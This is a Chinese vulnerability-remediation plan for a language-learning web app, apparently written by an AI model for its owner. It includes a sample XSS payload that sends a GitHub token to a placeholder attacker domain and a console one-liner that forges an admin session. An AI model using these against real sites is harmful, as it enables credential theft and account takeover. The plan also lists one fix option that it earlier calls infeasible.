# 西语工作台 · 漏洞修复方案详解（供你挑选）

> 日期：2026-08-05  
> 配套文档：`漏洞排查报告_2026-08-05.md`（讲发现了什么）  
> 本文档：讲**每个漏洞怎么修、有哪几种修法、各自代价和优劣**，你勾选后我再动手

---

## 0. 先看懂"最危险的一条链"

不是每个漏洞都孤立。下面这 3 个连起来，等于**别人能远程接管你整个工作台**：

```
P0-3（范文可塞脚本）
   ↓ 攻击者通过云同步，把一段恶意代码塞进你的"范文"字段
P1-1（GitHub Token 明文存在浏览器）
   ↓ 恶意脚本一行代码就能读到你的 Token，发到攻击者服务器
P0-1（CloudBase 密钥焊在网页源码）
   ↓ 攻击者拿到 Token 后，还能顺手扒到 CloudBase 密钥，直连你的生产数据库
```

**结论**：哪怕只修其中一个，链条就断了。所以这 3 个里**至少修 1-2 个**就能挡住大半风险。

---

# 一、P0 严重级（建议这周内处理）

## 🔴 P0-1 · CloudBase 长期密钥焊死在网页里

> **状态：止血方案 E 已完成（commit f90d6f6, 2026-08-05）**，根治方案 A 待排期。

### 大白话

就像把家里大门钥匙**焊在门口墙上**，还贴了张纸条"此钥匙有效期到 4089 年"。任何人按 F12 看源码就能拿走，直接开你家的门（生产数据库）。

### 危害场景

- 某天你的 Gist 被人写脏数据 → 用户打开工作台 → 自动同步下来 → 密钥被人扒走 → 他绕过登录直接操作所有用户数据
- 密钥 4089 年才过期 = 一辈子暴露

### 可选方案

| 方案                        | 怎么做                                         | 工作量             | 优点                    | 缺点                       | 推荐度                |
| ------------------------- | ------------------------------------------- | --------------- | --------------------- | ------------------------ | ------------------ |
| **A. 临时签名**               | 写个云函数，前端每次启动向它要一个"2 小时有效的临时通行证"，不用硬编码密钥     | 中（改云函数+前端初始化）   | 密钥永不落地到浏览器，业界标准做法     | 启动多一次网络请求                | ⭐⭐⭐⭐⭐ 长期最优         |
| **B. 后端代理**               | 前端完全不碰 CloudBase，所有请求走你自己的云函数转发             | 大（要写一层代理）       | 最安全，前端零密钥             | 改动大，每个接口都要代理             | ⭐⭐⭐ 长期备选           |
| **C. CI 注入**              | 构建时从环境变量塞密钥进 HTML                           | 小               | 源码仓库（GitHub）不泄露       | **线上 HTML 还是含密钥，等于没解决**  | ❌ 不推荐              |
| **D. 加 IP 白名单+限流**（控制台止血） | 在 CloudBase 控制台给该密钥加调用频率限制、IP 白名单           | 极小（10 分钟）       | 立即降低风险，无需改码           | **个人版会员无法配（标准版/企业版付费墙）** | ⛔ 已验证不可行           |
| **E. 应用层限流**（代码层止血）✅      | 在 siele-auth 云函数加 QPS 限流中间件（全局 30 + 单 IP 5） | 小（100 行代码 + 单测） | 不依赖控制台，个人版即可生效，AI 全自动 | 治标不治本，密钥仍在前端             | ✅ **已采用**（f90d6f6） |

### 实际风险再评估（重要）

经审计 admin.html：

- 所有 CloudBase 调用**已全部走 `callSieleAuth() → app.callFunction({name:'siele-auth'})`**（17 处调用，无任何直接 database/uploadFile/downloadFile）
- accessKey 仅用于 SDK 内部协议签名，**不是数据库明文密码**
- 真实业务鉴权（密码哈希、邀请码、session 签名、admin 校验）**全部在云函数内**
- 攻击者拿到 accessKey 后**只能刷公开 action**，被 siele-auth 鉴权 + E 限流双重卡住
- **真实攻击面比原始评估小得多**

### 我的建议

**E 已完成（今天止血）→ 排期做 A（一周内根治）**。E 是给大门加缓冲器，A 是把钥匙收回来只发临时卡。

---

## 🔴 P0-2 · 管理员身份可以伪造

### 大白话

你的管理员门禁卡**就是一张纸条**，上面写着"我是管理员"。谁都能自己写一张塞进 `localStorage`，系统就信了。

### 危害场景

- 任何用户在浏览器控制台粘一行代码：`localStorage.setItem('swa_cloud_session_v1', JSON.stringify({role:'admin'}))` → 刷新页面 → 管理员界面全部解锁
- 能看到全部用户列表、改用户状态、导出数据

### 可选方案

| 方案                  | 怎么做                                       | 工作量          | 优点                  | 缺点              | 推荐度       |
| ------------------- | ----------------------------------------- | ------------ | ------------------- | --------------- | --------- |
| **A. 云函数二次校验**      | 每个管理接口在云函数里查数据库确认该用户真是 admin，不信前端传的 role  | 中（每个管理接口都要改） | 根治，前后端分离的标准做法       | 改动点较多           | ⭐⭐⭐⭐⭐ 根治  |
| **B. JWT 签名**       | 登录时云函数签发一���带 role 的加密 JWT，前端每次请求带上，云函数验签 | 中            | 业界主流，可扩展（后续加权限粒度容易） | 要引入 JWT 库，学习成本  | ⭐⭐⭐⭐ 长期最优 |
| **C. 管理接口加 IP 白名单** | 管理云函数只允许你自己的 IP 访问                        | 小            | 简单粗暴有效              | 你换网络就用不了；多人管理不行 | ⭐⭐ 临时     |
| **D. 服务端 session**  | 在 CloudBase 数据库建一张 session 表，每次请求查表       | 中            | 比 JWT 简单，可主动注销      | 要维护 session 表   | ⭐⭐⭐       |

### 我的建议

**A 作为这周过渡方案**（改动直接、风险低）→ 长期演进到 **B（JWT）**。如果你只想止血，先做 C。

---

## 🔴 P0-3 · 范文里能塞"魔法咒语"（存储型 XSS）

### 大白话

你在笔记本上记范文。别人偷偷写一行"打开就自动执行"的咒语进去，你下次翻开笔记本，咒语就跑了——能偷你浏览器里存的所有东西（包括 GitHub Token）。

### 危害场景

- 攻击者往 Gist 同步桶塞一条范文：`<img src=x onerror="fetch('https://坏人.com?t='+localStorage.SCFG.token)">`
- 你的工作台同步下来 → 渲染范文 → 浏览器执行 onerror → Token 被发到坏人服务器
- **这是整条攻击链的入口，修了它链条就断了**

### 可选方案

| 方案                          | 怎么做                                                      | 工作量           | 优点                   | 缺点                               | 推荐度          |
| --------------------------- | -------------------------------------------------------- | ------------- | -------------------- | -------------------------------- | ------------ |
| **A. 改用 textContent**       | 把 `innerHTML = ...` 改成 `textContent = ...`，浏览器不当 HTML 解析 | **极小（2 行改动）** | 彻底根治，零副作用（范文本来就是纯文本） | 失去富文本能力（但你不需要）                   | ⭐⭐⭐⭐⭐ **首选** |
| **B. esc() 转义后再 innerHTML** | 用现有的 esc() 函数把 `<` `>` 等转成 `&lt;` `&gt;` 再塞进去            | 极小            | 保留 HTML 渲染能力         | 依赖 esc() 完整（见 P1-3，当前 esc() 有漏洞） | ⭐⭐⭐ 过渡       |
| **C. 引入 DOMPurify**         | 加一个专业的 HTML 消毒库，允许安全标签（`<b>` `<i>`），过滤危险属性               | 小（加 1 个库）     | 最专业，允许排版             | 增加 ~50KB 依赖                      | ⭐⭐ 仅当你要富文本时  |

### 我的建议

**直接选 A**。范文是学习材料，本来就不该有 HTML 排版，textContent 一了百了。5 分钟搞定。

---

# 二、P1 高危级（建议本月处理）

## 🟠 P1-1 · GitHub Token 明文存浏览器

### 大白话

你的保险柜钥匙（GitHub Token）**挂在客厅墙上**。家里进贼（XSS）一眼就能拿走。

### 可选方案

| 方案                      | 怎么做                                        | 工作量      | 优点            | 缺点                | 推荐度           |
| ----------------------- | ------------------------------------------ | -------- | ------------- | ----------------- | ------------- |
| **A. 改 sessionStorage** | Token 存 sessionStorage，关浏览器即清空             | 极小       | 减少持久暴露窗口      | 每次重开浏览器要重新填 Token | ⭐⭐⭐⭐ 立即做      |
| **B. 后端代理**             | Token 存你自己的后端，前端只发"同步"指令                   | 大        | 最安全，前端零 Token | 要部署后端             | ⭐⭐⭐⭐ 长期       |
| **C. 加密存储**             | Token 加密后存 localStorage，运行时解密              | 中        | 兼顾持久          | 加密密钥还在前端，本质不安全    | ⭐⭐ 不推荐        |
| **D. 限制 Token 权限**（止血）  | 在 GitHub 重新生成一个**只能读写 Gist**的 Token，撤掉其他权限 | 极小（5 分钟） | 即使泄露也只能动 Gist | 治标                | ⭐⭐⭐⭐ **立即先做** |

### 我的建议

**D 立即做（生成最小权限 Token）→ A 作为常规方案**。

---

## 🟠 P1-2 · 外刊抓取没有超时

### 大白话

你让人出去买报纸，他不回来你就在家一直等，**整个家（外刊页面）卡死**。

### 可选方案（只有一种正解）

| 方案                           | 怎么做                         | 工作量 | 优点        |
| ---------------------------- | --------------------------- | --- | --------- |
| **A. AbortController 8 秒超时** | fetch 包一层超时，8 秒没回来就放弃，走本地缓存 | 小   | 标准做法，无副作用 |

**必做**，没有替代方案。

---

## 🟠 P1-3 · esc() 转义函数有漏洞

### 大白话

你给门装了锁（esc 转义），但锁匠漏装了一种钥匙孔（单引号 `'` 和反斜杠 `\`）。小偷用这种钥匙照样能开锁。

### 危害场景

- 任何 onclick 拼接字符串的地方（比如 `onclick="saveT2ModelChanges('${id}')"`），如果 id 里有单引号，就能逃逸出来执行任意代码

### 可选方案

| 方案                          | 怎么做                                                       | 工作量 | 优点        | 缺点                | 推荐度      |
| --------------------------- | --------------------------------------------------------- | --- | --------- | ----------------- | -------- |
| **A. 补全 esc()**             | 加 `'`→`&#39;`、`\`→转义                                      | 极小  | 立即堵漏      | onclick 拼接本身就是坏味道 | ⭐⭐⭐⭐ 立即做 |
| **B. 全面改 addEventListener** | 去掉所有 onclick 字符串拼接，改用 `el.addEventListener('click', ...)` | 中   | 根治，现代写法   | 改动量大              | ⭐⭐⭐⭐ 长期  |
| **C. id 走白名单**              | 只允许 id 是字母数字                                              | 小   | 防住 id 这一类 | 治标                | ⭐⭐⭐ 补充   |

### 我的建议

**A 立即做（5 分钟）→ 后续重构时逐步 B**。

---

## 🟠 P1-4 · 云函数只看 Token 不验身份

### 大白话

你公司前台只看访客**有没有工牌**，不看工牌**是不是本人的**。捡到工牌的人就能进。

### 可选方案

| 方案                    | 怎么做                          | 工作量 | 推荐度     |
| --------------------- | ---------------------------- | --- | ------- |
| **A. 云函数校验 Token 归属** | 每次请求，云函数查这个 Token 是不是发给这个用户的 | 中   | ⭐⭐⭐⭐⭐   |
| **B. 配合 P0-2 的 JWT**  | Token 自带签名，云函数验签即可确认身份       | 中   | ⭐⭐⭐⭐ 长期 |
| **C. 加请求签名（HMAC）**    | 每次请求用 Token + 时间戳算个签名        | 中   | ⭐⭐⭐     |

### 我的建议

和 P0-2 一起做，**共用 JWT 方案最省事**。

---

## 🟠 P1-5 · 登录密码明文在窗口间传

### 大白话

主窗口把你的密码**大声喊**给后台 iframe 听。同屋的人（同源 XSS）都能听见。

### 可选方案

| 方案                    | 怎么做                                       | 工作量 | 优点     | 缺点                     | 推荐度    |
| --------------------- | ----------------------------------------- | --- | ------ | ---------------------- | ------ |
| **A. 密码不走前端**         | 主站不传密码给 iframe，iframe 自己有登录框              | 中   | 根治     | UX 稍差（要切换到 iframe 输密码） | ⭐⭐⭐⭐   |
| **B. 改传 Token**       | 主站传已登录的 Token 给 iframe，iframe 用 Token 免登录 | 中   | 体验好，安全 | 要先有 Token 机制           | ⭐⭐⭐⭐⭐  |
| **C. 加 source 校验+超时** | 校验消息来源是不是父窗口 + 10 秒超时                     | 小   | 止血     | 密码还是明文                 | ⭐⭐⭐ 过渡 |

### 我的建议

**C 先做止血 → 长期演进到 B**。

---

## 🟠 P1-6 · 外刊标题未转义

### 大白话

RSS 代理如果被人篡改，标题里塞脚本，你打开外刊就中招。

### 可选方案

渲染前 `esc()`，和 P0-3 同理。**必做，1 行改动**。

---

# 三、P2 中等级（择机处理）

## 🟡 P2-1 · 时区错乱导致签到/每日文章判断错

### 大白话

系统用格林威治时间（UTC）判断"今天是几号"。中国凌晨 0-8 点，UTC 还是"昨天"，于是你今天签到的记录被算到昨天去了，连续签到（streak）被掐断。

### 可选方案

| 方案               | 怎么做                                     | 工作量 | 推荐度   |
| ---------------- | --------------------------------------- | --- | ----- |
| **A. 统一用本地日期函数** | 删除 todayStr2()，全项目用 todayStr() 但改成取本地日期 | 小   | ⭐⭐⭐⭐⭐ |
| **B. 全部用 UTC**   | 反向统一，但学习数据按本地天统计更合理                     | 中   | ❌ 反人类 |

**推荐 A**，一次性根治。

---

## 🟡 P2-2 · 测验历史合并会丢数据

### 大白话

两台设备各做了 5 次测验。同步时系统比"谁长"，只留长的那个。短设备上的 5 次历史**全部丢失**。

### 可选方案

| 方案                    | 怎么做                | 工作量 | 推荐度      |
| --------------------- | ------------------ | --- | -------- |
| **A. 按 id+时间戳逐条合并去重** | 类似已有的 mergeById 逻辑 | 小   | ⭐⭐⭐⭐⭐    |
| **B. 时间戳决胜**          | 取最新那条              | 小   | ⭐⭐⭐ 会丢历史 |

**推荐 A**。

---

## 🟡 P2-3 · 数据导出未脱敏

### 大白话

导出的 JSON 里包含你的私人备注、学习计划原文。如果这文件被分享出去，隐私全裸奔。

### 可选方案

| 方案                     | 怎么做            | 工作量 | 推荐度   |
| ---------------------- | -------------- | --- | ----- |
| **A. 导出前打码备注/计划字段**    | 用 `***` 替换敏感字段 | 小   | ⭐⭐⭐⭐  |
| **B. 增加导出审计日志**        | 记录谁、何时导出过数据    | 中   | ⭐⭐⭐   |
| **C. 提供两档导出**（完整版/脱敏版） | 用户自选           | 小   | ⭐⭐⭐⭐⭐ |

**推荐 C**。

---

## 🟡 P2-4 · Service Worker 缓存旧版

### 大白话

浏览器把你**旧的、有漏洞的**工作台版本缓存在本地。你修了线上代码，老用户还是看到旧版，漏洞照在。

### 可选方案

| 方案                          | 怎么做                             | 工作量 | 推荐度     |
| --------------------------- | ------------------------------- | --- | ------- |
| **A. HTML 走 network-first** | HTML 每次优先从网络取，静态资源（CSS/JS）才缓存   | 小   | ⭐⭐⭐⭐⭐   |
| **B. 静态资源版本化**              | 文件名带 hash（app.v2.js），改了就自动失效    | 中   | ⭐⭐⭐⭐ 长期 |
| **C. SW 加版本号协商**            | SW 启动时拉一个 version.json，发现新版就清缓存 | 中   | ⭐⭐⭐     |

**推荐 A 立即做**。

---

## 🟡 P2-5 · 连续签到（streak）无防重入

### 大白话

同一天你打开工作台 10 次，签到计数可能被加 10 次，或者数据错乱被重置成 1。

### 可选方案

| 方案            | 怎么做                      | 工作量 | 推荐度    |
| ------------- | ------------------------ | --- | ------ |
| **A. 当日幂等标记** | 记录"今天已签到"，重复进入不再加        | 小   | ⭐⭐⭐⭐⭐  |
| **B. 加数值上限**  | `Math.min(streak, 9999)` | 极小  | ⭐⭐⭐ 补充 |

**推荐 A+B 一起做**。

---

## 🟡 P2-6 · 关闭页面时同步双写大对象

### 大白话

你关页面那一刻，系统**同步**把所有数据 stringify 两遍存下来。数据大时浏览器卡住，甚至写一半失败被静默吞掉。

### 可选方案

| 方案                            | 怎么做                          | 工作量 | 推荐度   |
| ----------------------------- | ---------------------------- | --- | ----- |
| **A. 用 sendBeacon**           | 浏览器提供的后台异步发送 API             | 小   | ⭐⭐⭐⭐⭐ |
| **B. 只在关键点写**                 | 不在 beforeunload 写，改成每次操作后增量写 | 中   | ⭐⭐⭐⭐  |
| **C. 失败时 console.error + 提示** | 不要静默 catch                   | 极小  | ⭐⭐⭐⭐  |

**推荐 A+C**。

---

# 四、P3 低级（顺手就改）

## 🔵 P3-1 · 答题 0 分时显示 NaN%

- **修法**：加 `total>0` 判断，显示"暂无数据"或 `0%`。**1 行**。

## 🔵 P3-2 · 管理接口一次拉全量无分页

- **修法**：加分页参数 `page/pageSize`，默认每页 50 条。**中等工作量**。

## 🔵 P3-3 · 登录失败错误码透传

- **修法**：对外统一返回"账号或密码错误"，不区分"用户不存在"和"密码错"。**小改动**。

---

# 五、套餐推荐（你直接挑一个）

| 套餐                 | 包含内容                                                                                                 | 总工作量      | 风险降幅       |
| ------------------ | ---------------------------------------------------------------------------------------------------- | --------- | ---------- |
| **🚑 急救包**（今天就能做完） | P0-3（textContent）+ P1-3（补 esc）+ P1-6（外刊转义）+ P1-1-D（最小权限 Token）+ P0-1-D（CloudBase 限流白名单）              | **半天**    | 断掉 80% 攻击链 |
| **🛡️ 标准包**（这周做完）  | 急救包 + P0-2-A（云函数校验）+ P1-2（RSS 超时）+ P1-5-C（postMessage source 校验）+ P2-4-A（SW network-first）+ P2-1（时区） | **2-3 天** | 风险降到可接受    |
| **💎 完整包**（本月做完）   | 标准包 + P0-1-A（临时签名）+ P0-2-B（JWT）+ P1-4（Token 归属校验）+ P1-1-B（后端代理）+ 所有 P2 + P3                          | **1-2 周** | 接近生产级安全    |

---

# 六、我的个人建议

如果让我替你拍板，我会选 **🚑 急救包**：

1. **P0-3 改 textContent**（5 分钟）——这是整条攻击链的入口，修了它链条就断
2. **P1-3 补 esc()**（5 分钟）——顺带的事
3. **P1-6 外刊标题 esc()**（1 行）——顺带的事
4. **P1-1-D 重新生成最小权限 GitHub Token**（你自己在 GitHub 网页操作 5 分钟）——即使泄露也只能动 Gist
5. **P0-1-E 应用层限流已部署**（commit f90d6f6）——siele-auth 全局 30 QPS + 单 IP 5 QPS，5/5 单测 PASS

**理由**：这 5 项加起来不到半天，能断掉 80% 的攻击链路，且**零业务影响、零学习成本、零部署风险**。其他重的（JWT、临时签名、后端代理）等你有空再排期，不急。

---

## 你现在的决策

请在下面**回复你选哪个套餐**（或勾选具体单项），我就开始动手：

- [ ] 选 🚑 急救包（推荐）
- [ ] 选 🛡️ 标准包
- [ ] 选 💎 完整包
- [ ] 我只要修这些：\_\_\_\_\_\_\_\_（填编号，如 P0-3、P1-3）
- [ ] 我有别的想法：\_\_\_\_\_\_\_\_
